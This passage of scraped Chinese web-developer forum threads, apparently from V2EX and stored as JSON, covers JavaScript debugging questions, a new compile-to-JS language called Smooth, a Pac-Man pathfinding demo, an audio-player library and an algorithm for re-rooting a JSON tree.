"mark~~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Github 传送门：<a href=\"https://github.com/bramblex/Smooth\" rel=\"nofollow\">https://github.com/bramblex/Smooth</a></p>\n<p>线上试用：<a href=\"http://bramblex.github.io/Smooth/\" rel=\"nofollow\">http://bramblex.github.io/Smooth/</a></p>\n<h2>特点：</h2>\n<h3>利用 do..with 语法糖轻松解决异步问题。</h3>\n<pre><code># 异步的 delay 函数\ndelay = `(ms)=&gt;(f)=&gt;setTimeout(()=&gt;f(ms),ms)`\n\n# 将一个普通的函数封装成异步函数\nmkasync = `(job)=&gt;(f)=&gt;{job();f()}`\n\n# 将多个异步函数串联到一起\nasync f g = f g\n\n# 以同步的方式写异步，每隔一秒依次输出 \"hello\" \"world\" \"smooth\"\nasyncJob = with async do\n     delay 1000\n     mkasync \\_-&gt; print $ \"hello\"\n     delay 2000\n     mkasync \\_-&gt; print \"world\"  \n     n &lt;- delay 3000 # 还可以取得异步函数的数据\n     mkasync \\_-&gt; print $ \"smooth \" + n \n     \nmain _ = asyncJob \\_ -&gt; print \"done\"\n</code></pre>\n<h3>可以自定义运算符</h3>\n<pre><code># 定义 `+` 符号\ninfixl 4 + add\nadd = `(x)=&gt;(y)=&gt;x+y`\n\n# 定义 `&lt;` 符号\ninfixl 6 &lt; lt\nlt = `(x)=&gt;(y)=&gt;x&lt;y`\n\n# 定义 `$` 符号，用来消除括号\ninfixr 0 $ app\napp f x = f x\n</code></pre>\n<h3>函数式和指令式混用</h3>\n<pre><code># 定义 `+` 符号\ninfixl 4 + add\nadd = `(x)=&gt;(y)=&gt;x+y`\n\n# 定义 `&lt;` 符号\ninfixl 6 &lt; lt\nlt = `(x)=&gt;(y)=&gt;x&lt;y`\n\nimpFunc n =\n    let result = 0\n    let i = 0\n    while i &lt; n\n    \tresult = result + i\n        i = i + 1\n    \t\ndecFunc n = if n &lt; 0 then 0 else n + decFunc n\n</code></pre>\n</div></div>"], "reply": "72", "tittle": "[今天生日]造了个编译到 JavaScript 的语言取名叫做 Smooth", "comment": ["生日快乐！", " 谢谢 /w\\", "🎉生日快乐🎉", "happy birthday", "`我不是 js`", " \r", "\r", "主要方便和 js 之间互操作 /w\\", " \r", " \r", "\r", "谢谢 ～ OwO ～", "明年就可以一起过生日了", "黑皮波斯忒", "迟到的生快~！", "快生", "膜拜大神，生日快乐，好像晚了", "生日快乐\\^O^/", "迟到的生快(=ﾟωﾟ)=", "这位姐姐生快～", "github 上的 readme 发现一处错别字，“其本质就是一个简单的 CPS 变幻” 应为 “变换”？", "生日快乐！", "完成之后马上弃坑么。。。", " 对… cps 变换，输入法的锅", " 不准备弃坑…我是准备拿这东西实用的…模块系统和类型系统还没加上去", " \r", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "上一条手误了，谢谢大家～", "生日快乐🎉🎉", "虽然看不懂，但是并不妨碍我说一句“生日快乐”", "生快", "需要哪些准备才能造一门语言？", "生快", "生日快乐\\^O^/\r", "虽然我也看不懂", "生日快乐 ~", "生日快乐", " 编译原理看一下", " \r", "\r", "赶紧抱紧大腿，膜拜之～", " \r", " \r", " \r", " \r", " \r", "\r", "谢谢大家～ OwO", "生快   代码什么的看不懂...", " \r", " \r", "\r", "我在造第一个版本，也就是 Smooth 的前身 BlxScript 的时候还没有看过编译原理……\r", "\r", "其实很多东西并没有想象得那么复杂，我建议是不看书，先用自己的方式尝试实现，等实现完了再去看书看理论。如果一开始就看书，可以说你完全不知道书里讲得啥；明白书里讲啥了还是不明白为啥要真么做；明白为啥这么做了又不知道这东西该用在那里；明白该用在那里了又不知道该怎么用……而先自己尝试用自己的想法去实现一个模型，再回去翻书，上面的一系列坑就都没有了。", "服服服服服", "虽然我也看不懂，但是生快！", " 谢谢～", "JJ 生日快乐~", " 谢谢", "生日快乐", "啊 我明天呢╮(￣⊿￣\")╭被你抢先一步", "没写过 haskell 的表示看起来真要命 😂  (生快", "大触生快", "生日快乐", "生日快乐么么哒，感觉认识好久了", " 那预祝明天生日快乐哈～ OwO~", " 只是语法像 haskell 因为我懒～", " 谢谢～", "生日快乐！", " /w\\ 哈哈哈～", "╮(╯▽╰)╭生日快乐🎂", "生日快乐\\^O^/", "又是个做编译器的大神", "好吧，不认识，一样恭祝：生日快乐！！！🎂🎂🎂", " purescript", "生日快乐", "生日快乐🎉🎉🎉！ Star 一个先！ ヽ(́◕◞౪◟◕‵)ﾉ", " \r", " \r", " \r", "\r", "谢谢大家～", " \r", "\r", "哎呦 /w\\\r", "居然有人认识 PureScript ~", "路过并支持\r", "自制语言其中的苦乐是一种很特别的经历", " CPS 变换给点赞～", "哇塞， CPS 变换，比我前不久写的渣渣编译器厉害多了( ", ")", "生日快乐！\r", "\r", "mkasync 要是改成 await ，当作关键字，就跟 python3.5, es6, c# 的异步差不多了", " \r", "\r", "CPS 大法确实挺好的 /w\\", " \r", "\r", "你的比我厉害多了 /w\\ 我的还没有后端呢～", "\r", "\r", "当然差很多……\r", "说句不好听的 pthon3.5 / es6 的 await 全是垃圾，把原本非常简单的问题搞得那么复杂。 c # 不会，所以不喷", " \r", "\r", "/w\\ 其实说实话，我就是因为不想写 JavaScript ，并且觉得 Coffee 不够好， PureScript 不够方便我才自己造的～\r", "\r", "啦啦啦～", "为什么用 purescript 写，这语言有什么优越之处？", " 显示优越感，光一个简单的 Monad 就能把绝大多数码农挡灾墙外", "好屌，虽然看不懂，但还是生日快乐~", "JJ 的思念生日快乐（"]},
{"content": "", "reply": "3", "tittle": "单击 Mac 触摸板触发的 event.button 值怎么是 0?", "comment": ["不然呢？触摸板单击不就是鼠标左键单击吗？", " 不应该是 1 吗", " 没注意是 IE8😥😥😥\r", "\r", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Chrome 硬是说我玩的这段代码有问题\n<img alt=\"\" src=\"http://i2.buimg.com/52cc0f5f0e779ea5.png\">\n然而看了一下发现并没有什么问题啊\n<img alt=\"\" src=\"http://i2.buimg.com/c5f5ab29414eeb8f.png\">\n贴一下代码\n<a href=\"http://runjs.cn/code/hac1pxrh\" rel=\"nofollow\">http://runjs.cn/code/hac1pxrh</a></p>\n</div></div>", "<div class=\"topic_content\">问题已解决，是  onload 的问题😖</div>"], "reply": "9", "tittle": "写 JS 遇到一个很奇怪的问题", "comment": ["你确定 note 节点 有 value 值？", "怎么看都是没找到#node 吧？", "#note", "你確定這個 if 運行的時候#note 有加載出來了？把這個語句放在 onload 或者文檔尾試下…", "你忘了输入#号在 node 前面", "window.onload", " textarea 应该有吧", " \r", " 真的是 onload 的问题，之前还以为 function 没关系，谢谢", "localstorage  \r", "我有个小项目也是这个，支持代码高亮，多页 用的第三方库\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Uncaught TypeError: jsonp20 is not a function\nUncaught TypeError: jsonp22 is not a function\n.......\n<a href=\"http://ww1.sinaimg.cn/mw690/69dd3998gw1f4c12l24ccj20i103rq49.jpg\" rel=\"nofollow\">http://ww1.sinaimg.cn/mw690/69dd3998gw1f4c12l24ccj20i103rq49.jpg</a>\n一个刷新操作如果正常点击是没问题的，要是每隔几秒自动调用一次浏览器就会报这种错</p>\n</div></div>"], "reply": "5", "tittle": "频繁对接口轮询调用为何会偶尔报错？", "comment": ["超时？建议 alert jsonop 看看", "问题不完整，明显你代码没有注册相应的全局函数来处理返回的 script 数据。", " 然而这个是直接用 jQuery 封装的 ajax 来进行 jsonp 处理的..", " 没有代码判断不了错误。 jQuery 默认是用随机的字符做回调函数名，看你这里是指定了回调名字，应该是这里有问题。", "加载不完整"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了一下 Prototypejs 现在都还在更新， Scripty2 这个基于 Prototypejs 的特效库都已经处于测试状态 3 年了。是不是意味着 Prototypejs 大势已去？</p>\n</div></div>"], "reply": "8", "tittle": "Prototypejs 为什么还在更新？", "comment": ["我认为一个软件是否维护取决于组织和个人意愿。和是否符合潮流无关。 Prototypejs 虽然是侵入式的，但是不可否认其实还挺好用。当然，后一句随便说说，勿喷。", "第一次完整阅读完的开源库就是 prototypejs ，到现在一些场景中还在使用～", "人家愿意更新是负责任的表现啊 总有系统在用吧", "免费库更新真不容易。几年前买了 discuz 的商业版，后来免费了，再后来没人维护了，我们花钱的用户找谁去。", "欧洲的电商用 Magento 的居多，而 Magento1.x 就是基于 PrototypeJs ，虽然我们日常开发会选择绕开它用 jQuery ，但是总还是有些东西要用到它，比方说在启用 React 之前，一直是用基于 PrototypeJs 的 VarienForm 来做表单验证。", " discuz 现在都不维护了吗？", " 很早就不维护了", "mootools 也在维护好像"]},
{"content": ["<div class=\"topic_content\">&lt;script&gt;\r<br>function SafariAutoPlay() {\r<br>music.load();\r<br>music.play();\r<br>}\r<br>var music=document.getElementById('music');\r<br>window.addEventListener('touchstart',SafariAutoPlay,false);\r<br>SafariAutoPlay.addEventListener('play',function() {\r<br>window.removeEventListener('touchstart',SafariAutoPlay,false);\r<br>},false);\r<br>&lt;/script&gt;\r<br>使用以上代码，在非 Safari 时会报这么一个错：\r<br>Uncaught TypeError: SafariAutoPlay.addEventListener is not a function 。\r<br>怎样使其不报错？我尝试使用判断 UA 的方式，但是发现在手机上直接不播放了。</div>"], "reply": "5", "tittle": "用 JavaScript，使 Safari 自动播放时出现了小问题。", "comment": ["SafariAutoPlay.addEventListener('play'\r", "应该是\r", "music.addEventListener('play'\r", "吧？", " 我是参考了这里来改，这里的也没有判断。\r", " 不过手机细看了下，估计有效，感谢。", "你的代码写错了", "话说，这段代码不判断 UA 的话对其他浏览器有什么影响？"]},
{"content": ["<div class=\"topic_content\"><img src=\"http://ww3.sinaimg.cn/large/96ced919gw1f4dik7740kg20z20emgql.gif\" class=\"embedded_image\" border=\"0\"> \r<br>如图左右两边容器 ID 为 left 和 right\r<br>\r<br>1.当按下鼠标左键开始拖动 right 容器里的 2 号标签到 left 容器,光标进入 left 容器后释放鼠标左键,这时候 drop 事件的响应函数里 e.target 值为 2 号标签.\r<br>\r<br>2.反之,拖动一号标签到 right 容器,当光标进入 right 容器后释放鼠标左键,这时候 drop 事件的响应函数里的 e.target 值为 right 容器\r<br>\r<br>问题来了,当触发 drop 事件时光标是在那两个拖动的标签上,所以我的理解是 e.target 应该是那两个拖动的标签,为什么会出现 e.target 值为 right 容器这种情况呢\r<br>\r<br>附上 CodePend 地址\r<br><a target=\"_blank\" href=\"http://codepen.io/isbase/pen/MeWqww\" rel=\"nofollow\">http://codepen.io/isbase/pen/MeWqww</a>\r<br>\r<br>在 codepen 实例和 GIF 中还可以看到在拖动标签时 console 里 allowdrop=true 的时候,我将正在拖动标签的 cursor 指定为 copy,但是只有我说的第一种情况达到了目的,第二张情况虽然 console 里显示拖动标签的 cursor 值为 copy,但是实际上光标已经变成默认的箭头了.</div>"], "reply": "5", "tittle": "用 JavaScript 实现拖动遇到一个事件相关的问题", "comment": ["LZ 这里用的是 mouseup 事件，建议看下文档：\r", "\r", "\r", "\r", "mouseup 事件的 target 是当前 DOM 最顶部的元素。试着给你拖拽的元素加了个 z-index ，每次释放的时候 target 就是拖拽的元素了。", " \r", "\r", "Thanks\r", "\r", "问题解决了,我再去仔细研究一下原理", "演示动态图什么工具生成的？", " LICEcap", " thanx 很不错的小工具"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>上次放出了自己写的吃豆游戏，大家对里面的幽灵围堵玩家的算法挺感兴趣的，这次就把寻址算法的样例放出来吧～其实就是最短路径的寻找，无非我在里面做了一个处理，使多个幽灵能够配合着一起围堵玩家！</p>\n<p>考虑：如果幽灵都是用同一套算法的话，那么很可能出现玩家在逃跑的时候幽灵在后面排队追！由于幽灵的速度比玩家慢，这样永远赢不了玩家\n处理：每个幽灵都单独寻址，把其他幽灵当作墙壁的一部分，这样总是可以顾及其他幽灵的位置而重新找一条路，造成“合作围堵”的效果</p>\n<p>吃豆游戏演示： <a href=\"http://passer-by.com/pacman/\" rel=\"nofollow\">http://passer-by.com/pacman/</a>\n吃豆游戏项目： <a href=\"https://github.com/mumuy/pacman/\" rel=\"nofollow\">https://github.com/mumuy/pacman/</a></p>\n<p>迷宫寻路算法演示： <a href=\"http://passer-by.com/finder/\" rel=\"nofollow\">http://passer-by.com/finder/</a>\n迷宫寻路项目： <a href=\"https://github.com/mumuy/finder\" rel=\"nofollow\">https://github.com/mumuy/finder</a></p>\n</div></div>"], "reply": "12", "tittle": "一个迷宫寻址算法", "comment": ["谢谢分享", "感谢！收藏^_^", " 可以玩玩看", "好玩好玩。", "赞。", "？？？是我个人问题么。我经常感觉按了按键反应不灵敏啊", " +1", "聪明", " 游戏还是寻径算法", " 谢谢，还有很多功能没加呢", "mark~", " Thanks ～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/ClassicOldSong/bPlayer\" rel=\"nofollow\">GitHub repo</a></p>\n<p><a href=\"https://classicoldsong.github.io/bPlayer\" rel=\"nofollow\">Demo</a></p>\n<p>上次在<a href=\"https://v2ex.com/t/278516\" rel=\"nofollow\">Blyde 的发布帖</a>里提到过 bPlayer ，但那时的 bPlayer 还没有完成我想要实现的功能。最近有空把 bPlayer 更新到了 v0.2.0-alpha ，已经实现了绝大多数预期的功能了，简单地作为原生 audio 的替代品还是足够的，所以先与大家分享一下。</p>\n<p>bPlayer 旨在取代原生 audio 标签以带来更丰富的操作以及更清爽统一的体验，并且不依赖任何库。最简单的用法仅需在页面内引入 bplayer.js 和 bplayer.css 以后，即可自动搜索页面内的 audio 标签并替换为 bplayer 标签。同时还可以通过 JSON 创建播放器，以及使用链式操作进行控制。 bplayer 标签提供了几个与原生 audio 标签行为一致的操作方法，所以绝大多数人都可以轻松上手。</p>\n<p>目前提供了两种显示模式，一种为正常模式，高度为 60px ；一种为苗条(slim)模式，高度为 30px 。当播放器宽度小于 460px 时会自动切换为窄(narrow)模式。对触摸支持良好，已知 iOS 上无法控制音量以及切换静音，这是 iOS 的限制，并非 bug 。</p>\n<p>欢迎各位体验以及提建议提 Issue ，如果愿意的话可以提交 PR 帮助一起开发，谢谢~</p>\n<p>下面放一张截图：</p>\n<p><img alt=\"pic\" src=\"https://ooo.0o0.ooo/2016/05/31/574d9c906dba7.png\"></p>\n<p>最后欢迎各位访问我的博客：<a href=\"http://classicoldsong.me\" rel=\"nofollow\">C 次元</a></p>\n</div></div>"], "reply": "7", "tittle": "bPlayer - 原生音频播放器的绝佳替代品", "comment": ["滋此。", "进度条太小了…", "Starred 。\r", "进度条太小+1 ，另外只有一个条状的风格还是感觉少了些什么（遁", " @", " 进度条在鼠标移过的时候会变宽，平时很窄是为了给文字留空间。。。如果觉得风格太少的话可以手动指定宽度为 60px （正常模式）或者 30px （ slim 模式），这样就得到了一个只有封面，控制按钮还有进度条的播放器了 233", " 道理我都懂，但是为何不用文字的背景做进度条呢？", " 因为 1: 太俗， 2: 影响进度控制", " 其实比较想要一个卡片式的 Skin （ whispering\r", "不过现在这个也相当棒了，过两天有空就拿来试试看"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是一个前端萌新，现在身为一个大学狗，准备学习 js 和 jquery ，想问下各位大神，是先学好 js 还是在学习 js 的同时把 jquery 也一起学上？</p>\n</div></div>"], "reply": "37", "tittle": "js 和 jquery", "comment": ["准备以后出去找做前端的工作，求大神们指点下，前端都要学些什么， js 和 jQuery 在前端的分量大不大啊。😕😕", "两者不冲突啊 JS 是语言 jq 是一个操作 DOM 的库而已\r", "不过在学习 JS 是涉及到 DOM 的时候 用 JQ 方便一些 建议学习 JQ 同时也知道用原生 API 这么操作就可以了\r", "\r", "不过当然是 JS 先开始学习 等开始碰到 DOM 的时候 再同时上 jq", " 哦哦谢谢你，", "这种东西既然关系到自己的发展，怎么还这么不上心，还搞错东西，跑过来提问", " 除了 DOM 还有 Ajax 和 CSS3 等等 也要在涉及的时候学起来", "先把 js 搞熟练了 不要管其他的\r", "jquery 看个文档半小时上手\r", "jquery 只是前端坑的开始\r", "下次不要问这种问题了 没意义", "那怕只能用百度，这种问题也不会找不到答案吧？", "用原生 js 吧， jq 只是个库，有很多替代品。", "jq 现在快淘汰了吧，最后的余晖了", "歪楼，楼上发现妹子一名。", "jq 学了也无所谓 什么叫快淘汰了 要考虑到那些还要做 ie8-兼容性的人好吧\r", "而且 jq 不难学也不难用 就是选择器而已 学好了以后 querySelectors 还可以用", "不会 JavaScript ，如何用 jQuery", " 这位二楼说的很好。 LZ 一定要先把这两者关系搞清楚了啊！", " @", "  😐😐好的下次一定注意。。", "  好的，", " 好的，谢谢", "先学 ECMAScript ，也就是 JS 核心部分；\r", "然后学 DOM/Browser API ，那是用来操作网页和浏览器的；或者学 Node.js ，基本上能干各种事情；\r", "最后考虑自己写 jQuery ，或者直接拿 jQuery 来用。", "百度贴吧既视感", " 哦哦，好的，我现在就是每天看 js 的视频，然后准备在买本书搭配学习，大学闲的时间太多了，想把以后要出去干的事情提前准备好，没想到问了个这么 2 的问题。。。😭😭", " ", " 比较详细，略有些过时，不过不是大问题", " 统一。 jquery 没啥好学的。。要用也就会了", "我以前也纠结这个问题，后来发现根本不需要纠结：\r", "该用的时候用 —— jQuery\r", "该学的时候学 —— JavaScript\r", "不冲突", " 好的谢谢～", "先看《 javascript 高级程序设计》吧，我觉得挺好的这本书", " 贴吧只喜欢瞎逛，回复的少，四年吧龄，才一个 10 级😐😐", " 我就准备买这本书来着，和视频一块结合看😬", " 好的，谢谢指点😋", "就问你用 jQuery 怎么算 1 + 1", "   jQuery(1+1)[0]  ...", "你现在是迷茫期，有这种问题是很正常的， 越是迷茫的时候越不能乱撞，你结合各种关键词 bing 或 google （ 如果你有条件的话） 比如 javascript jQuery   javascript 和 jQuery 等等，先了解下然后去找一个有论然的前端配置机构网站，去看看他们的开源的教学视频，先上手，然后你就知道接下来该干嘛了", " 好的。谢谢，", " 但是 1+1 是 JS 的语法呀。", " $('#id1').add('#id2').size()  这样就是 jQ 的写法了（不能用 length ，因为 length 也是 JS 数组的属性）", "jQuery 只是一个 JavaScript 的库而已，不懂 JavaScript 基础语法， jQuery 也只会用得迷迷糊糊。", "  ORZ...", " 好的👌🏻"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>install</p>\n<pre><code>$ npm i reg-match-arr\n</code></pre>\n<p>usage example:</p>\n<pre><code>import regMatchArr from 'reg-match-arr'\nconst str = 'hi, i am timqian, 600, 564, 112'\nconst regExp = /(\\d{3})(,)/ig\nregMatchArr(str, regExp) // [ [ '600', ',' ], [ '564', ',' ] ] \n</code></pre>\n<p><strong><a href=\"https://github.com/timqian/reg-match-arr\" rel=\"nofollow\">github repo</a></strong></p>\n<p><strong><a href=\"https://www.npmjs.com/package/reg-match-arr\" rel=\"nofollow\">npm addr</a></strong></p>\n<h2>用到的 es6/7-npm-package-starter</h2>\n<p><a href=\"https://github.com/ProjecToday/npm-starter\" rel=\"nofollow\">https://github.com/ProjecToday/npm-starter</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "reg-match-arr: Find regExp matched item array of given string", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有如下一段 json 数据</p>\n<pre><code>{\n    \"name\": \"18912386146\", \n    \"size\": 45, \n    \"children\": [\n        {\n            \"name\": \"13811179796\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18511331067\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18631867507\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18616261983\", \n            \"size\": 45, \n            \"children\": [\n                {\n                    \"name\": \"13811179796\", \n                    \"size\": 10\n                }, \n                {\n                    \"name\": \"18995390312\", \n                    \"size\": 10\n                }\n            ]\n        }, \n        {\n            \"name\": \"13466692515\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"13650731515\", \n            \"size\": 45, \n            \"children\": [\n                {\n                    \"name\": \"13811179796\", \n                    \"size\": 10\n                }, \n                {\n                    \"name\": \"13037986580\", \n                    \"size\": 10\n                }, \n                {\n                    \"name\": \"18995390312\", \n                    \"size\": 10\n                }\n            ]\n        }, \n        {\n            \"name\": \"15809619551\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18601191669\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"15909638715\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"15909619055\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18902266418\", \n            \"size\": 63, \n            \"children\": [\n                {\n                    \"name\": \"13560047280\", \n                    \"size\": 63\n                },\n                {\n                    \"name\": \"13632270695\", \n                    \"size\": 10\n                }, \n                {\n                    \"name\": \"13650731515\", \n                    \"size\": 45\n                }, \n                {\n                    \"name\": \"13268069280\", \n                    \"size\": 167\n                }\n            ]\n        }, \n        {\n            \"name\": \"13037986580\", \n            \"size\": 10\n        }, \n        {\n            \"name\": \"18995390312\", \n            \"size\": 10\n        }\n    ]\n}\n</code></pre>\n<p>上面这段 json 数据对应成图,<img alt=\"图片描述\" src=\"https://sfault-image.b0.upaiyun.com/196/109/1961091872-57504dbc41b77_articlex\">\n现在点击紫色的大圆点,即其中一个叶子节点,会反转成根节点,重新生成图形,这样一个效果;\n只需要对 json 数据进行反转即可;\n需要通过遍历算法转成下面这样</p>\n<pre><code>{\n    \"name\": \"13268069280\", \n    \"size\": 167, \n    \"children\": [\n        {\n            \"name\": \"18902266418\", \n            \"size\": 63,\n            \"children\": [\n\t\t        {\n                    \"name\": \"13560047280\", \n                    \"size\": 63\n                },\n                {\n                    \"name\": \"13632270695\", \n                    \"size\": 10\n                }, \n                {\n                    \"name\": \"13650731515\", \n                    \"size\": 45\n                }, \n                {\n                    \"name\": \"18912386146\", \n                    \"size\": 45,\n                    \"children\": [\n\t\t\t\t        {\n\t\t\t\t            \"name\": \"13811179796\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"18511331067\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"18631867507\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"18616261983\", \n\t\t\t\t            \"size\": 45, \n\t\t\t\t            \"children\": [\n\t\t\t\t                {\n\t\t\t\t                    \"name\": \"13811179796\", \n\t\t\t\t                    \"size\": 10\n\t\t\t\t                }, \n\t\t\t\t                {\n\t\t\t\t                    \"name\": \"18995390312\", \n\t\t\t\t                    \"size\": 10\n\t\t\t\t                }\n\t\t\t\t            ]\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"13466692515\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"13650731515\", \n\t\t\t\t            \"size\": 45, \n\t\t\t\t            \"children\": [\n\t\t\t\t                {\n\t\t\t\t                    \"name\": \"13811179796\", \n\t\t\t\t                    \"size\": 10\n\t\t\t\t                }, \n\t\t\t\t                {\n\t\t\t\t                    \"name\": \"13037986580\", \n\t\t\t\t                    \"size\": 10\n\t\t\t\t                }, \n\t\t\t\t                {\n\t\t\t\t                    \"name\": \"18995390312\", \n\t\t\t\t                    \"size\": 10\n\t\t\t\t                }\n\t\t\t\t            ]\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"15809619551\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"18601191669\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"15909638715\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"15909619055\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"13037986580\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }, \n\t\t\t\t        {\n\t\t\t\t            \"name\": \"18995390312\", \n\t\t\t\t            \"size\": 10\n\t\t\t\t        }\n\t\t\t\t    ]\n                }\n\t\t    ]\n        }\n    ]\n}\n</code></pre>\n<p>不知道各位有没有比较好的算法实现?</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>我再把需求抽象一下吧,\n输入json为\nvar json='{\"name\":\"A\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"C\",\"size\":10},{\"name\":\"D\",\"size\":10},{\"name\":\"E\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"F\",\"size\":10}]},{\"name\":\"G\",\"size\":10},{\"name\":\"H\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"I\",\"size\":10},{\"name\":\"F\",\"size\":10}]},{\"name\":\"J\",\"size\":10},{\"name\":\"Q\",\"size\":10},{\"name\":\"L\",\"size\":10},{\"name\":\"M\",\"size\":10},{\"name\":\"N\",\"size\":63,\"children\":[{\"name\":\"O\",\"size\":63},{\"name\":\"P\",\"size\":10},{\"name\":\"H\",\"size\":45},{\"name\":\"Q\",\"size\":167}]},{\"name\":\"I\",\"size\":10},{\"name\":\"R\",\"size\":10}]}';\n对应成图\n<img src=\"https://sfault-image.b0.upaiyun.com/343/233/3432331933-5750e81a80ee1_articlex\"></p>\n<p>输出json为\nvar data='{\"name\":\"Q\",\"size\":167,\"children\":[{\"name\":\"N\",\"size\":63,\"children\":[{\"name\":\"O\",\"size\":63},{\"name\":\"P\",\"size\":10},{\"name\":\"H\",\"size\":45},{\"name\":\"A\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"C\",\"size\":10},{\"name\":\"D\",\"size\":10},{\"name\":\"E\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"F\",\"size\":10}]},{\"name\":\"G\",\"size\":10},{\"name\":\"H\",\"size\":45,\"children\":[{\"name\":\"B\",\"size\":10},{\"name\":\"I\",\"size\":10},{\"name\":\"F\",\"size\":10}]},{\"name\":\"J\",\"size\":10},{\"name\":\"Q\",\"size\":10},{\"name\":\"L\",\"size\":10},{\"name\":\"M\",\"size\":10},{\"name\":\"I\",\"size\":10},{\"name\":\"R\",\"size\":10}]}]}]}';\n对应成图\n<img src=\"https://sfault-image.b0.upaiyun.com/343/233/3432331933-5750e81a80ee1_articlex\"></p>\n<p>输入json, 输出json结构类似, 仅仅根节点反转了, 叶子节点转成根节点, 叶子节点的父节点转成子节点, 对应成图形结构不变; 例如图片所示, 原来的根节点A为中心生成图形, 现在是根节点Q为中心生成图形;</p>\n</div></div>", "<div class=\"topic_content\">第二张图\r<br>&lt;img src=\"https://sfault-image.b0.upaiyun.com/173/993/1739937525-5750e82a8b856_articlex\" /&gt;</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>第二张图</p>\n<img src=\"https://sfault-image.b0.upaiyun.com/173/993/1739937525-5750e82a8b856_articlex\">\n</div></div>"], "reply": "23", "tittle": "跪求 js 解决 JSON 子节点转根节点,本人使用深度优先遍历算法未实现(d3.js 树状关系网络),求一段优雅的 js", "comment": ["我在 segmentfault 上面也发了 ", " , 不知道他们为什么审核那么慢", "我尝试用递归实现,没有达到效果\r", "```\r", "                var json='';\r", "\t\tfunction isArray(o) {  \r", "\t\t  return Object.prototype.toString.call(o) === '[object Array]';   \r", "\t\t} \r", "\t\tfunction dfs(_key,o){\r", "\t\t    if(o.children) { \r", "\t\t        for (var v in o.children) {\r", "\t\t            var child = o.children[v];\r", "\t\t            if(child.name && _key == child.name) return o;\r", "\t\t            dfs(_key,child);\r", "\t\t        }\r", "\t\t    } \r", "\t\t}\r", "\r", "\r", "```", "不太看得懂问题，把一个节点提升到变成根节点，\r", "然后“对 json 数据进行反转”，反转的规则是能描述下么？", "递归会很简单\r", "1. 找到你要开始反转的节点\r", "2. 开始递归：输入，反转节点和直接父节点，操作，反转并更新需要反转的节点，终止条件，跟节点\r", "\r", "PS: 深度，广度随你，遍历的时候标记每个节点父节点和需要反转的节点即可", "每个节点加个 pid 指向父节点的 id", "题主在这里显然连问题的输入和输出都没有描述明确。\r", "暂且假设输入是一个 json 对象，输出是一个重新指定根节点所谓“反转”的 json 对象，\r", "由于输入是 json 对象，注意是 json 对象！因此是无法如 LS 这位仁兄所说的简单调整节点之间的父子关系的。\r", "因此，在鄙人看来，应首先对原 json 对象进行一次转换，转换成什么呢？转换成一个等价的无向图。\r", "无向图长什么样呢？题主自己其实已经贴出来了。\r", "有了这个等价的无向图以后，指定其中任意出度为 1 的节点作为“根节点”均可深度遍历改图，在图遍历过程中重新构建新的 json 对象即可。\r", "这里值得注意的是，图的深度遍历恰好符合 json 对象的重构顺序，楼主可以选一个结构相对简单的 json 对象进行实验，思路仅供参考。", "来一段代码意思一下吧，\r", "假设有已经构建完成了一个等价于原 j 输入 son 对象的无向图，\r", "那么指定其中任意一个出度为 1 的节点作为新的根节点，利用无向图的深度优先遍历（遍历过程注意标记节点是否曾经被访问过），容易得到以下重构 json 对象的方法：\r", "\r", "def reconstruct_json(node ， visited):\r", "____retval = {}\r", "____for key in node.keys():\r", "________retval[key] = node.values[key]\r", "____visited[node] = True\r", "____has_children = len(node.neighbors) > 0 and any(not visited[child] for child in node.neighbors)\r", "____if has_children:\r", "                retval[\"children\"] = []\r", "________for child in node.neighbors:\r", "                        if not visited[child]:\r", "________________retval[\"children\"].append(reconstruct_json(child, visited))\r", "____return retval", "def reconstruct_json(node, visited): \r", "____retval = {} \r", "____for key in node.keys(): \r", "________retval[key] = node.values[key] \r", "____visited[node] = True \r", 